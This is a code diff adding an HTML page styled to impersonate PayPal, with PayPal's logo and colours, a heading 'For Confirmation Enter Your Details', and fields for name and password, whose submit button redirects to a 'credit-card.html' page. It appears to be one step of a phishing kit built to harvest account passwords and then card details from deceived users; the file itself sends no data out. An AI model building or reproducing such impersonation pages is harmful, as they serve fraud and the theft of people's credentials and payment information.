@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Your Details</title>
+    <style>
+        /* Add the same CSS from earlier */
+        body {
+            background: linear-gradient(135deg, #0070ba, #00488f);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 15px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+        }
+        button {
+            background-color: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo" style="width: 150px;">
+    <h2>For Confirmation Enter Your Details</h2>
+    <form id="detailsForm">
+        <label for="firstName">First Name</label>
+        <input type="text" id="firstName" name="firstName" placeholder="Enter your first name" required>
+        
+        <label for="lastName">Last Name</label>
+        <input type="text" id="lastName" name="lastName" placeholder="Enter your last name" required>
+
+        <label for="fullName">Full Name</label>
+        <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
+
+        <label for="password">Enter Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+        <button type="button" onclick="nextPage()">Submit</button>
+    </form>
+</div>
+
+<script>
+    function nextPage() {
+        // Perform validation or store data if needed
+        window.location.href = "credit-card.html"; // Redirect to the credit card page
+    }
+</script>
+
+</body>
+</html>
